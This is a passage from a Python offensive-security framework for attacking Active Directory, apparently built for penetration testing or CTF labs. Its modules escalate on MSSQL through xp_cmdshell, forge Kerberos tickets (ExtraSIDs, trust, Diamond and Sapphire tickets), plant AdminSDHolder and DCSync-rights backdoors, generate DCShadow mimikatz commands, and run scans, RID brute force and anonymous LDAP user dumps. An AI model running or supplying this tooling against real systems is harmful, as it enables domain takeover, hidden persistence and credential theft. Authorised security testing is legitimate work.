            if not mssqlc: log('impacket-mssqlclient required','error'); hr(); return
            method = self.ask('method','impersonate',['impersonate','trustworthy','check'])

            def _run_sql(queries):
                proc = subprocess.Popen(_mssql_auth(),
                                       stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                       stderr=subprocess.STDOUT, text=True, errors='replace')
                try:
                    full = '\n'.join(queries) + '\nexit\n'
                    out, _ = proc.communicate(input=full, timeout=20)
                    lines = [l for l in out.splitlines() if l.strip() and 'Impacket' not in l]
                    for l in lines: print(f'  {WHITE}{l}{RESET}')
                    return '\n'.join(lines)
                except subprocess.TimeoutExpired:
                    proc.kill(); return ''

            if method == 'check':
                log('Checking impersonation rights and trustworthy DBs...','info')
                _run_sql([
                    "SELECT distinct b.name FROM sys.server_permissions a "
                    "INNER JOIN sys.server_principals b ON a.grantor_principal_id=b.principal_id "
                    "WHERE a.permission_name='IMPERSONATE';",
                    "SELECT name,is_trustworthy_on FROM sys.databases WHERE is_trustworthy_on=1;",
                    "SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');",
                ])

            elif method == 'impersonate':
                log('Escalate via EXECUTE AS LOGIN (impersonate sa/dbo)','info')
                target_login = self.ask('login to impersonate','sa')
                cmd_r        = self.ask('command after escalation','whoami')
                out = _run_sql([
                    f"EXECUTE AS LOGIN='{target_login}';",
                    "SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');",
                    "EXEC sp_configure 'show advanced options',1; RECONFIGURE;",
                    "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;",
                    f"EXEC xp_cmdshell '{cmd_r}';",
                    "REVERT;",
                ])
                if 'NT AUTHORITY' in out or 'SYSTEM' in out.upper():
                    log(f'{GREEN}SYSTEM access achieved via impersonation{RESET}','success')
                    add_result('mssql', f'privesc via impersonate {target_login}')

            elif method == 'trustworthy':
                log('Escalate via TRUSTWORTHY database + EXECUTE AS OWNER','info')
                db_name = self.ask('trustworthy DB name','msdb')
                cmd_r   = self.ask('command to run','whoami')
                out = _run_sql([
                    f"USE {db_name};",
                    "EXECUTE AS USER='dbo';",
                    "EXEC master..sp_configure 'show advanced options',1; RECONFIGURE;",
                    "EXEC master..sp_configure 'xp_cmdshell',1; RECONFIGURE;",
                    f"EXEC master..xp_cmdshell '{cmd_r}';",
                    "REVERT;",
                ])
                if 'NT AUTHORITY' in out or 'SYSTEM' in out.upper():
                    log(f'{GREEN}SYSTEM access via trustworthy DB{RESET}','success')
                    add_result('mssql', f'privesc via trustworthy {db_name}')


        hr()


# =============================================================================
# TRUSTS — cross-domain/forest trust abuse
# =============================================================================
class Trusts(Module):
    name='trusts'; description='cross-domain/forest trust abuse -- SID history, ExtraSIDs, trust tickets'; category='exploitation'
    def run(self, target):
        if not self.req(target): return
        hr()
        action = self.ask('action','enum',['enum','extrasids','sidhistory','ticket'])
        hr()

        if action == 'enum':
            bloody = check_tool('bloodyad','bloodyAD')
            nxc    = check_tool('netexec','nxc','crackmapexec','cme')
            if bloody:
                base = [bloody,'--host',target.dc,'-d',target.domain,'-u',target.user]
                if target.password: base += ['-p',target.password]
                elif target.hash:   base += ['-p',f':{target.hash}']
                run_cmd(base+['get','trusts'], label='bloodyAD enum trusts')
            if nxc:
                run_cmd([nxc,'ldap',target.dc]+target.nxc_args()+['--trusted-for-delegation'],
                        label='netexec trusts')

        elif action == 'extrasids':
            log('ExtraSIDs attack — inject Enterprise Admin SID into inter-forest ticket','info')
            log(f'{ORANGE}Requires krbtgt hash of child domain and trust key{RESET}','warn')
            child_domain = self.ask('child domain')
            child_sid    = self.ask('child domain SID')
            ea_sid       = self.ask('Enterprise Admins SID (parent)',f'{child_sid[:-4]}519')
            krbtgt_hash  = self.ask('child krbtgt NT hash')
            user_rid     = self.ask('target user RID','500')
            t2 = check_tool('impacket-ticketer','ticketer.py')
            if not t2: log('impacket-ticketer not found','error'); return
            out = os.path.join(target.loot_dir,'extrasids_ticket.ccache')
            run_cmd([t2,'-nthash',krbtgt_hash,'-domain-sid',child_sid,
                     '-domain',child_domain,'-extra-sid',ea_sid,
                     '-user-id',user_rid,'administrator','-outfile',out],
                    label='ticketer ExtraSIDs')
            log(f'Ticket: {WHITE}{out}{RESET}','success')
            log(f'Export: {WHITE}export KRB5CCNAME={out}{RESET}','info')

        elif action == 'sidhistory':
            log('SID History injection — add privileged SID to user sIDHistory','info')
            t2 = check_tool('bloodyad','bloodyAD')
            if not t2: return
            target_user = self.ask('target user to inject SID history into')
            sid_to_add  = self.ask('SID to inject (e.g. Enterprise Admins SID)')
            base = [t2,'--host',target.dc,'-d',target.domain,'-u',target.user]
            if target.password: base += ['-p',target.password]
            elif target.hash:   base += ['-p',f':{target.hash}']
            run_cmd(base+['set','object',target_user,'sIDHistory','-v',sid_to_add],
                    label='bloodyAD SID history')

        elif action == 'ticket':
            log('Inter-realm trust ticket — forge TGT across trust','info')
            trust_key  = self.ask('trust key (NT hash)')
            target_dom = self.ask('target domain')
            t2 = check_tool('impacket-ticketer','ticketer.py')
            if not t2: return
            out = os.path.join(target.loot_dir,'trust_ticket.ccache')
            run_cmd([t2,'-nthash',trust_key,'-domain',target.domain,
                     '-domain-sid',self.ask('domain SID'),
                     '-spn',f'krbtgt/{target_dom}','administrator','-outfile',out],
                    label='ticketer trust ticket')
        hr()


# =============================================================================
# ACL-PERSIST — AdminSDHolder backdoor + DCSync rights persistence
# =============================================================================
class ACLPersist(Module):
    name='aclpersist'; description='ACL persistence -- AdminSDHolder backdoor, DCSync rights, RBCD persist'; category='persistence'
    def run(self, target):
        if not self.req(target): return
        bloody = self.need('bloodyad','bloodyAD')
        if not bloody: return
        hr()
        action = self.ask('action','adminsdholder',['adminsdholder','dcsync-rights','genericall'])
        hr()
        base = [bloody,'--host',target.dc,'-d',target.domain,'-u',target.user]
        if target.password: base += ['-p',target.password]
        elif target.hash:   base += ['-p',f':{target.hash}']

        if action == 'adminsdholder':
            log(f'{ORANGE}AdminSDHolder backdoor — ACE propagates to all protected accounts every 60min{RESET}','warn')
            backdoor_user = self.ask('user to grant GenericAll via AdminSDHolder')
            adminsdholder_dn = f'CN=AdminSDHolder,CN=System,DC={target.domain.replace(".",",DC=")}'
            run_cmd(base+['add','genericAll',adminsdholder_dn,backdoor_user],
                    label='bloodyAD AdminSDHolder backdoor')
            log(f'{GREEN}Backdoor set — {backdoor_user} will have GenericAll on all protected accounts after next SDProp run{RESET}','success')
            log(f'Force SDProp now (if DA): {WHITE}Invoke-SDPropagator{RESET}','info')

        elif action == 'dcsync-rights':
            log('Granting DCSync rights (GetChangesAll + GetChanges) to backdoor user','info')
            log(f'{ORANGE}Requires WriteDACL on domain — e.g. via Exchange Windows Permissions membership{RESET}','warn')
            backdoor_user = self.ask('user to grant DCSync rights', target.user)
            target_dn = 'DC=' + ',DC='.join(target.domain.split('.'))

            # try bloodyAD first
            rc = run_cmd(base+['add','dcsync',backdoor_user], label='bloodyAD grant DCSync rights')

            # fallback: dacledit
            if rc != 0:
                log(f'{ORANGE}bloodyAD failed — trying dacledit{RESET}','warn')
                dacledit = check_tool('dacledit.py','impacket-dacledit')
                if dacledit:
                    auth, extra = target.imp_str()
                    dc_cmd = [dacledit,'-action','write','-rights','DCSync',
                              '-principal',backdoor_user,
                              '-target-dn',target_dn,
                              '-dc-ip',target.dc] + auth + extra
                    rc2 = run_cmd(dc_cmd, label='dacledit grant DCSync')
                    if rc2 == 0:
                        log(f'{GREEN}DCSync rights granted via dacledit to {WHITE}{backdoor_user}{RESET}','success')
                        add_result('bloody', f'DCSync rights → {backdoor_user}')
                        log(f'Now run: {C0}dcsync{RESET}','info')
                        hr(); return
                else:
                    log('dacledit not found — try: pip install impacket --break-system-packages','error')
            else:
                log(f'{GREEN}DCSync rights granted to {WHITE}{backdoor_user}{RESET}','success')
                add_result('bloody', f'DCSync rights → {backdoor_user}')
                log(f'Now run: {C0}dcsync{RESET}','info')

        elif action == 'genericall':
            log('Granting GenericAll on target object','info')
            obj_target    = self.ask('target object (DN or sAMAccountName)')
            backdoor_user = self.ask('user to grant GenericAll to')
            run_cmd(base+['add','genericAll',obj_target,backdoor_user],
                    label='bloodyAD GenericAll')
        hr()


# =============================================================================
# DCSHADOW — rogue DC registration for stealthy AD object modification
# =============================================================================
class DCShadow(Module):
    name='dcshadow'; description='DCShadow -- register rogue DC, push stealthy changes to AD via replication'; category='persistence'
    def run(self, target):
        if not self.req(target): return
        hr()
        log(f'{RED}DCShadow requires {WHITE}DA privileges{RED} and a Windows machine to register the rogue DC{RESET}','warn')
        log(f'{GREY}Uses mimikatz lsadump::dcshadow on Windows, or impacket-dcsync from Linux{RESET}','info')
        hr()
        action = self.ask('action','info',['info','push','dcsync-validate'])

        if action == 'info':
            log('DCShadow attack flow:','info')
            print(f'  {GREEN}1{RESET}  {WHITE}mimikatz{RESET} {GREY}# on a Windows machine with DA token{RESET}')
            print(f'     {GREY}lsadump::dcshadow /object:targetuser /attribute:SIDHistory /value:S-1-5-21-...-519{RESET}')
            print(f'  {GREEN}2{RESET}  {WHITE}mimikatz (second window){RESET}')
            print(f'     {GREY}lsadump::dcshadow /push{RESET}')
            print(f'  {GREEN}3{RESET}  {WHITE}validate from Linux:{RESET}')
            print(f'     {GREY}impacket-secretsdump {target.domain}/{target.user}@{target.dc} -just-dc-user targetuser{RESET}')
            hr()
            log(f'For Linux-based DCShadow: {WHITE}pydcshadow{RESET} (not yet in mainstream impacket)','info')

        elif action == 'push':
            log(f'{ORANGE}Generate DCShadow push commands for mimikatz{RESET}','warn')
            obj      = self.ask('object to modify (sAMAccountName)')
            attr     = self.ask('attribute',None,['SIDHistory','primaryGroupID','scriptPath','msDS-KeyCredentialLink'])
            val      = self.ask('value')
            print(f'\n  {GREY}# Run on Windows with DA token:{RESET}')
            print(f'  {WHITE}mimikatz # lsadump::dcshadow /object:{obj} /attribute:{attr} /value:{val}')
            print(f'  mimikatz # lsadump::dcshadow /push{RESET}\n')

        elif action == 'dcsync-validate':
            obj = self.ask('object to validate')
            t2  = check_tool('impacket-secretsdump','secretsdump.py')
            if t2:
                auth, extra = target.imp_str()
                run_cmd([t2]+auth+extra+['-just-dc-user',obj],
                        label='secretsdump validate DCShadow')
        hr()


# =============================================================================
# SMBCLIENT — interactive SMB file browser
# =============================================================================
class SMBClient(Module):
    name='smbclient'; description='smbclient -- interactive SMB file browser, upload/download files'; category='lateral'
    def run(self, target):
        if not self.req(target): return
        hr()
        ccache = os.environ.get('KRB5CCNAME','')
        use_krb = ccache and os.path.exists(ccache)
        # Kerberos requires FQDN
        default_host = (target.dc_fqdn or target.dc) if use_krb else target.dc
        t_host = self.ask('target', default_host)
        share  = self.ask('share','C$')
        if use_krb:
            log(f'{GREEN}Kerberos auth — using ccache: {WHITE}{ccache}{RESET}','info')
        else:
            user   = self.ask('username', target.user or 'guest')
            passwd = self.ask('password', target.password or '')
        hr()
        sys_smbclient = check_tool('smbclient')
        imp_smbclient = check_tool('impacket-smbclient','smbclient.py')

        if sys_smbclient:
            log(f'{GREEN}smbclient — interactive shell{RESET}','success')
            log(f'{GREY}Commands: ls, cd, get, put, mget, exit{RESET}','info')
            if use_krb:
                # system smbclient -k is deprecated/broken — prefer impacket-smbclient for Kerberos
                if imp_smbclient:
                    log(f'{GREEN}Using impacket-smbclient for Kerberos auth{RESET}','info')
                    # impacket-smbclient syntax: target is //host/share
                    # impacket-smbclient: target format is domain/user@host and uses interactive mode
                    # share is selected inside the session with 'use <share>'
                    cmd = [imp_smbclient,f'{target.domain}/{target.user}@{t_host}',
                           '-k','-no-pass','-dc-ip',target.dc]
                    log(f'{GREY}Once connected type: use {share}{RESET}','info')
                    log(f'{GREY}{" ".join(cmd)}{RESET}','info'); hr()
                    subprocess.call(cmd)
                else:
                    # fallback: set env and try anyway
                    env_krb = os.environ.copy()
                    env_krb['KRB5CCNAME'] = ccache
                    cmd = [sys_smbclient, f'//{t_host}/{share}', '-k', '-N']
                    log(f'{GREY}{" ".join(cmd)}{RESET}','info'); hr()
                    subprocess.call(cmd, env=env_krb)
                hr(); return
            elif target.password:
                cmd = [sys_smbclient, f'//{t_host}/{share}',
                       '-U', f'{user}%{passwd}', '-W', target.domain or '']
            elif target.hash:
                cmd = [sys_smbclient, f'//{t_host}/{share}',
                       '-U', user, '--pw-nt-hash', '-p', target.hash]
            else:
                cmd = [sys_smbclient, f'//{t_host}/{share}', '-U', f'{user}%', '-N']
            if not use_krb and target.domain: cmd += ['-W', target.domain]
            log(f'{GREY}{" ".join(cmd)}{RESET}','info'); hr()
            subprocess.call(cmd)
        elif imp_smbclient:
            log(f'{GREEN}impacket-smbclient{RESET}','success')
            if use_krb:
                subprocess.call([imp_smbclient,
                    f'{target.domain}/{target.user}@{t_host}','-k','-no-pass','-share',share])
            else:
                auth, hashes = target.imp_str(t_host)
                subprocess.call([imp_smbclient]+auth+hashes+['-share',share])
        else:
            log('smbclient not found — install: sudo apt install smbclient','error')
        hr()


# =============================================================================
# DIAMOND/SAPPHIRE TICKETS
# =============================================================================
class DiamondTicket(Module):
    name='diamond'; description='Diamond Ticket -- modify existing TGT PAC (less detectable than golden ticket)'; category='exploitation'
    def run(self, target):
        if not self.req(target): return
        t = self.need('impacket-ticketer','ticketer.py')
        if not t: return
        hr()
        log(f'{GREY}Diamond ticket modifies a real TGT PAC — harder to detect than forged golden tickets{RESET}','info')
        krbtgt_hash = self.ask('krbtgt NT hash')
        domain_sid  = self.ask('domain SID')
        groups      = self.ask('extra group SIDs (comma-sep, e.g. 512,519)','512,519,518,516,520')
        user        = self.ask('user to impersonate','administrator')
        out         = os.path.join(target.loot_dir,f'diamond_{user}.ccache')
        run_cmd([t,'-nthash',krbtgt_hash,'-domain-sid',domain_sid,
                 '-domain',target.domain,'-groups',groups,
                 '-user-id','500',user,'-outfile',out],
                label='diamond ticket')
        if os.path.exists(out):
            log(f'Ticket: {WHITE}{out}{RESET}','success')
            log(f'Export: {WHITE}export KRB5CCNAME={out}{RESET}','info')
            log(f'DCSync: {WHITE}impacket-secretsdump -k -no-pass {target.domain}/{user}@{target.dc}{RESET}','info')
        hr()


class SapphireTicket(Module):
    name='sapphire'; description='Sapphire Ticket -- copy PAC from legit TGS (most stealthy ticket attack)'; category='exploitation'
    def run(self, target):
        if not self.req(target): return
        t = self.need('impacket-ticketer','ticketer.py')
        if not t: return
        hr()
        log(f'{GREY}Sapphire ticket copies PAC from a real TGS — PAC is indistinguishable from legitimate{RESET}','info')
        log(f'{ORANGE}Requires S4U2self to obtain TGS for the target user first{RESET}','warn')
        krbtgt_hash   = self.ask('krbtgt NT hash')
        domain_sid    = self.ask('domain SID')
        impersonate   = self.ask('user to impersonate','administrator')
        tgs_ccache    = self.ask('TGS ccache (from S4U2self step, blank = skip)')
        out           = os.path.join(target.loot_dir,f'sapphire_{impersonate}.ccache')
        cmd = [t,'-nthash',krbtgt_hash,'-domain-sid',domain_sid,
               '-domain',target.domain,'-user-id','500',impersonate,
               '-outfile',out]
        if tgs_ccache: cmd += ['-impersonate',impersonate,'-additional-ticket',tgs_ccache]
        run_cmd(cmd, label='sapphire ticket')
        if os.path.exists(out):
            log(f'Ticket: {WHITE}{out}{RESET}','success')
            log(f'Export: {WHITE}export KRB5CCNAME={out}{RESET}','info')
        hr()



# =============================================================================
# UNAUTH — unauthenticated enumeration and attacks
# =============================================================================

# =============================================================================
# NMAP — port scan + AD-specific service detection
# =============================================================================
class Nmap(Module):
    name='nmap'; description='nmap -- port scan, service detection, AD-specific scripts'; category='recon'
    def run(self, target):
        nmap = self.need('nmap')
        if not nmap: return
        hr()
        action = self.ask('action','quick',['quick','full','ad','vuln','stealth'])
        host   = self.ask('target host', target.dc or '')
        if not host: log('Target host required','error'); hr(); return
        out_file = os.path.join(target.loot_dir, f'nmap_{action}.txt') if target.loot_dir else f'/tmp/nmap_{action}.txt'
        hr()

        if action == 'quick':
            log('Quick scan — top 1000 ports + service detection','info')
            cmd = [nmap,'-sV','-sC','-T4','--open','-oN',out_file, host]

        elif action == 'full':
            log('Full scan — all 65535 ports','info')
            cmd = [nmap,'-sV','-sC','-p-','-T4','--open','-oN',out_file, host]

        elif action == 'ad':
            log('AD-focused scan — common AD ports + scripts','info')
            ad_ports = '21,22,25,53,80,88,110,111,135,139,143,389,443,445,464,593,636,3268,3269,3389,5985,5986,8080,8443,9389'
            scripts  = 'smb-security-mode,smb2-security-mode,ldap-rootdse,ms-sql-info,msrpc-enum'
            cmd = [nmap,'-sV','-sC',f'-p{ad_ports}','--script',scripts,
                   '--open','-T4','-oN',out_file, host]

        elif action == 'vuln':
            log('Vulnerability scan — known CVEs and misconfigs','info')
            cmd = [nmap,'-sV','--script','vuln','-T4','-oN',out_file, host]

        elif action == 'stealth':
            log('Stealth scan — SYN scan, no ping, randomized timing','info')
            cmd = ['sudo',nmap,'-sS','-Pn','-T2','--randomize-hosts',
                   '--open','-oN',out_file, host]

        log(f'{GREY}{" ".join(str(c) for c in cmd)}{RESET}','info')
        hr()
        import subprocess as _sp_nmap
        import time as _time_nmap
        spinner_chars = '⠋⠙⠹⠸⼼⠴⠦⠧⠇⠏'
        si = 0
        _start_nmap = _time_nmap.time()
        _open_count = 0
        _open_ports = []
        proc = _sp_nmap.Popen(cmd + ['--stats-every','2s'],
                               stdout=_sp_nmap.PIPE, stderr=_sp_nmap.STDOUT,
                               text=True, errors='replace')
        _register_proc(proc)
        raw_lines = []
        _pct = 0
        for line in proc.stdout:
            raw_lines.append(line.rstrip())
            if '/tcp' in line and 'open' in line:
                m = re.search(r'(\d+)/tcp\s+open\s+(\S+)', line)
                if m:
                    _open_count += 1
                    _open_ports.append(f'{m.group(1)}/{m.group(2)}')
            # parse nmap stats percentage
            pct_m = re.search(r'(\d+\.\d+)% done', line)
            if pct_m: _pct = float(pct_m.group(1))
            _elapsed = int(_time_nmap.time() - _start_nmap)
            _mins, _secs = divmod(_elapsed, 60)
            _time_str = f'{_mins}m{_secs:02d}s' if _mins else f'{_secs}s'
            _port_str = f'  {PINK}{_open_count} open{RESET}' if _open_count else ''
            _pct_str  = f'  {GREY}{_pct:.0f}%{RESET}' if _pct > 0 else ''
            # show last 2 open ports found
            _last_ports = f'  {C0}{", ".join(_open_ports[-2:])}{RESET}' if _open_ports else ''
            sys.stdout.write(f'\r  {spinner_chars[si % len(spinner_chars)]} scanning {host}  {GREY}{_time_str}{RESET}{_pct_str}{_port_str}{_last_ports}   ')
            sys.stdout.flush(); si += 1
        _unregister_proc(proc)
        proc.wait()
        sys.stdout.write('\r' + ' '*80 + '\r')
        sys.stdout.flush()

        # write to file
        if target.loot_dir:
            os.makedirs(target.loot_dir, exist_ok=True)
        with open(out_file,'w') as _f: _f.write('\n'.join(raw_lines))

        # parse and display clean summary
        ports = re.findall(r'(\d+)/tcp\s+open\s+(\S+)', '\n'.join(raw_lines))
        interesting = {
            '21':'FTP', '22':'SSH', '25':'SMTP', '53':'DNS',
            '80':'HTTP', '88':'Kerberos', '110':'POP3',
            '135':'RPC', '139':'NetBIOS', '389':'LDAP',
            '443':'HTTPS', '445':'SMB', '464':'kpasswd',
            '593':'RPC-HTTP', '636':'LDAPS', '1433':'MSSQL',
            '3268':'Global Catalog', '3269':'GC-SSL',
            '3389':'RDP', '5985':'WinRM', '5986':'WinRM-SSL',
            '8080':'HTTP-Alt', '8443':'HTTPS-Alt', '9389':'AD-WS',
        }
        suggestions = []
        if ports:
            log(f'{GREEN}{len(ports)} open port(s):{RESET}','success')
            for port, svc in ports:
                tag = f'{PINK} ← {interesting[port]}{RESET}' if port in interesting else ''
                print(f'  {C0}{port:>5}/tcp{RESET}  {WHITE}{svc:<20}{RESET}{tag}')
            port_nums = {p for p,_ in ports}
            if '445'  in port_nums: suggestions.append('enum')
            if '389'  in port_nums: suggestions.append('ldapenum')
            if '88'   in port_nums: suggestions.append('asreproast')
            if '5985' in port_nums: suggestions.append('exec')
            if '1433' in port_nums: suggestions.append('mssql')
            if '80'   in port_nums or '443' in port_nums or '8443' in port_nums:
                suggestions.append('ffuf/certipy')
            if '443'  in port_nums or '8443' in port_nums:
                if '88' in port_nums: suggestions.append('certipy')
            if '21'   in port_nums: suggestions.append('ftp')
            if suggestions:
                log(f'Suggested: {WHITE}{" → ".join(suggestions)}{RESET}','info')
                # auto-trigger offer
                auto_mods = [s for s in suggestions if '/' not in s]
                if auto_mods:
                    log(f'{GREY}Auto-run suggestions? type module name or press enter to skip{RESET}','info')
                    for s in auto_mods[:3]:
                        ans = input_field(f'run {C0}{s}{RESET}? [y/n]','n')
                        if ans == 'y':
                            mod = MODULES.get(s)
                            if mod:
                                log(f'{PINK}→ auto-running {s}{RESET}','info')
                                hr()
                                mod().run(TARGET)
            add_result('nmap', f'{len(ports)} ports — {",".join(p for p,_ in ports[:6])}')
        else:
            log('No open ports found','warn')
        log(f'Full output: {WHITE}{out_file}{RESET}','info')


# =============================================================================
# FFUF — web fuzzing for ADCS, Exchange, OWA, web apps on AD hosts
# =============================================================================
class FFuf(Module):
    name='ffuf'; description='ffuf -- web directory/vhost fuzzing for ADCS, Exchange, OWA, admin panels'; category='recon'
    def run(self, target):
        ffuf = self.need('ffuf')
        if not ffuf: return
        hr()
        action = self.ask('action','adcs',['adcs','dirs','vhosts','params'])
        host   = self.ask('target URL (e.g. https://10.10.10.10 or http://host)')
        if not host: log('Target URL required','error'); hr(); return
        host   = host.rstrip('/')
        wl_dir = '/usr/share/seclists/Discovery/Web-Content'
        wl_vhost = '/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt'
        out_file = os.path.join(target.loot_dir, f'ffuf_{action}.json') if target.loot_dir else f'/tmp/ffuf_{action}.json'
        hr()

        if action == 'adcs':
            log('Fuzzing for ADCS/PKI web enrollment endpoints','info')
            # known ADCS paths
            adcs_paths = [
                '/certsrv', '/certsrv/certrqxt.asp', '/certsrv/certfnsh.asp',
                '/certsrv/certcarc.asp', '/ADPolicyProvider_CEP_UsernamePassword/service.svc',
                '/ADPolicyProvider_CEP_Kerberos/service.svc',
                '/CertSrv/mscep/mscep.dll', '/certsrv/mscep_admin/',
                '/OCSP', '/CertEnroll',
            ]
            found = []
            import urllib.request as _ur, ssl as _ssl
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            log('Probing known ADCS endpoints...','info')
            for path in adcs_paths:
                url = f'{host}{path}'
                try:
                    req = _ur.Request(url, headers={'User-Agent':'Mozilla/5.0'})
                    resp = _ur.urlopen(req, context=ctx, timeout=5)
                    code = resp.getcode()
                    found.append((url, code))
                    log(f'{GREEN}[{code}] {WHITE}{url}{RESET}','success')
                except Exception as e:
                    code = str(e)[:20]
                    if '401' in code or '403' in code:
                        found.append((url, code))
                        log(f'{ORANGE}[{code}] {WHITE}{url}{RESET}','warn')
            if found:
                log(f'{GREEN}{len(found)} ADCS endpoint(s) found{RESET}','success')
                add_result('ffuf', f'ADCS: {len(found)} endpoint(s)')
                log(f'Run: {C0}certipy find{RESET} to enumerate templates','info')

            # also ffuf for any remaining web paths
            wl = f'{wl_dir}/quickhits.txt'
            if os.path.exists(wl):
                cmd = [ffuf,'-u',f'{host}/FUZZ','-w',wl,'-mc','200,301,302,401,403',
                       '-o',out_file,'-of','json','-t','50','-timeout','5','-fs','0']
                if target.user and target.password:
                    import base64 as _b64
                    cred = _b64.b64encode(f'{target.user}:{target.password}'.encode()).decode()
                    cmd += ['-H',f'Authorization: Basic {cred}']
                run_cmd(cmd, label='ffuf quickhits')

        elif action == 'dirs':
            wl = self.ask('wordlist', f'{wl_dir}/directory-list-2.3-medium.txt')
            ext = self.ask('extensions (blank = none)','asp,aspx,php,html,txt')
            cmd = [ffuf,'-u',f'{host}/FUZZ','-w',wl,
                   '-mc','200,301,302,401,403','-o',out_file,'-of','json',
                   '-t','50','-timeout','5','-fs','0']
            if ext: cmd += ['-e',f'.{ext.replace(",",",.")}']
            if target.user and target.password:
                import base64 as _b64
                cred = _b64.b64encode(f'{target.user}:{target.password}'.encode()).decode()
                cmd += ['-H',f'Authorization: Basic {cred}']
            run_cmd(cmd, label='ffuf dirs')

        elif action == 'vhosts':
            domain = self.ask('base domain', target.domain or '')
            wl     = self.ask('wordlist', wl_vhost)
            if not os.path.exists(wl): log(f'Wordlist not found: {wl}','error'); hr(); return
            cmd = [ffuf,'-u',host,'-w',wl,'-H',f'Host: FUZZ.{domain}',
                   '-mc','200,301,302,401,403','-o',out_file,'-of','json',
                   '-t','50','-timeout','5','-fs','0']
            run_cmd(cmd, label='ffuf vhosts')

        elif action == 'params':
            param_wl = f'{wl_dir}/burp-parameter-names.txt'
            if not os.path.exists(param_wl):
                param_wl = self.ask('parameter wordlist')
            url_path = self.ask('URL path to fuzz params on (e.g. /search.asp?FUZZ=test)')
            if 'FUZZ' not in url_path: url_path += '?FUZZ=test'
            cmd = [ffuf,'-u',f'{host}{url_path}','-w',param_wl,
                   '-mc','200,301,302','-o',out_file,'-of','json','-t','30']
            run_cmd(cmd, label='ffuf params')

        # parse json output
        if os.path.exists(out_file):
            try:
                data = json.loads(open(out_file, errors='replace').read())
                results = data.get('results',[])
                if results:
                    log(f'{GREEN}{len(results)} result(s) found:{RESET}','success')
                    for r in results[:20]:
                        print(f'  {C0}[{r.get("status","")}]{RESET}  {WHITE}{r.get("url","")}{RESET}  {GREY}{r.get("length","")} bytes{RESET}')
                    add_result('ffuf', f'{len(results)} paths found on {host}')
            except Exception:
                pass
        hr()


class Unauth(Module):
    name='unauth'; description='unauthenticated enum -- SMB/LDAP signing, NTLM, null sessions, LDAP anon, username enum, AS-REP roast, RID brute'; category='recon'
    def run(self, target):
        if not target.dc: log('Set DC IP first — run: set','error'); return
        hr()
        action = self.ask('action','all',['all','signing','ldap','userenum','asreproast','rid','null','smb-info'])
        hr()

        users_found = []
        ul = os.path.join(target.loot_dir,'users.txt')
        existing_ul = ul if os.path.exists(ul) else ''

        if action in ('all','signing'):
            nxc = check_tool('netexec','nxc','crackmapexec','cme')
            if nxc:
                log(f'{C0}Checking SMB/LDAP signing and NTLM status...{RESET}','info')
                _, smb_lines = run_cmd_capture([nxc,'smb',target.dc], label='SMB info')
                _, ldap_lines = run_cmd_capture([nxc,'ldap',target.dc], label='LDAP info')
                all_lines = smb_lines + ldap_lines
                for l in all_lines:
                    if 'signing' in l.lower() or 'channel binding' in l.lower() or 'ntlm' in l.lower():
                        if 'false' in l.lower() or 'disabled' in l.lower():
                            print(f'  {GREEN}{l.strip()}{RESET}  {GREY}← exploitable{RESET}')
                        else:
                            print(f'  {ORANGE}{l.strip()}{RESET}')
                hr()
                log(f'{GREY}SMB signing=False → relay attacks possible (relay module){RESET}','info')
                log(f'{GREY}LDAP signing=None  → LDAP relay possible{RESET}','info')
                log(f'{GREY}NTLM=False         → Kerberos-only environment{RESET}','info')

        if action in ('all','ldap'):
            log(f'{C0}Anonymous LDAP search — dumping users/groups{RESET}','info')
            ldapsearch = check_tool('ldapsearch')
            if ldapsearch and target.domain:
                base_dn = ','.join([f'dc={p}' for p in target.domain.split('.')])
                # dump all user sAMAccountNames
                try:
                    out = subprocess.check_output(
                        [ldapsearch,'-x','-H',f'ldap://{target.dc}',
                         '-b',base_dn,
                         '(objectClass=person)','sAMAccountName','cn','description'],
                        text=True, stderr=subprocess.DEVNULL, timeout=15)
                    # extract sAMAccountNames
                    users_ldap = re.findall(r'sAMAccountName:\s*(\S+)', out)
                    descs = re.findall(r'description:\s*(.+)', out)
                    if users_ldap:
                        log(f'{GREEN}Found {len(users_ldap)} users via anonymous LDAP{RESET}','success')
                        for u in users_ldap: print(f'  {WHITE}{u}{RESET}')
                        # save to users.txt
                        existing = set(open(ul, errors='replace').read().splitlines()) if os.path.exists(ul) else set()
                        new_u = [u for u in users_ldap if u not in existing and '$' not in u]
                        if new_u:
                            with open(ul,'a') as f: f.write('\n'.join(new_u)+'\n')
                            log(f'Added {len(new_u)} users to users.txt','success')
                            users_found += new_u
                    if descs:
                        log(f'{ORANGE}Descriptions found — may contain passwords:{RESET}','warn')
                        for d in descs: print(f'  {PINK}{d}{RESET}')
                except subprocess.TimeoutExpired:
                    log('ldapsearch timed out','warn')
                except Exception as e:
                    log(f'ldapsearch failed: {e}','error')
            else:
                log('ldapsearch not found or domain not set','error')

        if action in ('all','smb-info'):
            nxc = check_tool('netexec','nxc','crackmapexec','cme')
            if nxc:
                log('SMB info (null session)...','info')
                run_cmd([nxc,'smb',target.dc], label='netexec smb info')

        if action in ('all','null'):
            nxc = check_tool('netexec','nxc','crackmapexec','cme')
            if nxc:
                log('Null session enum...','info')
                _, lines = run_cmd_capture([nxc,'smb',target.dc,'-u','guest','-p','','--shares','--users','--rid-brute'])
                users = _parse_usernames(lines, target.domain)
                if users: users_found.extend(users); _save_users(users, target.loot_dir, target.domain)

        if action in ('all','rid'):
            nxc = check_tool('netexec','nxc','crackmapexec','cme')
            if nxc and target.domain:
                # try with current creds first, fall back to guest, then null
                rid_attempts = []
                if target.user and (target.password or target.hash):
                    rid_attempts.append((target.user, target.password or f':{target.hash}', 'current creds'))
                rid_attempts.append(('guest', '', 'guest session'))
                rid_attempts.append(('', '', 'null session'))
                for u, p, label in rid_attempts:
                    log(f'RID brute ({label})...','info')
                    cmd = [nxc,'smb',target.dc,'-u',u,'-p',p,'--rid-brute','10000']
                    if target.domain: cmd += ['-d',target.domain]
                    _, lines = run_cmd_capture(cmd)
                    users = _parse_usernames(lines, target.domain)
                    if users:
                        users_found.extend(users)
                        _save_users(users, target.loot_dir, target.domain)
                        log(f'{GREEN}{len(users)} users found via {label}{RESET}','success')
                        break
                    log(f'{label} failed — trying next...','warn')

        if action in ('all','userenum'):
            kb = check_tool('kerbrute')
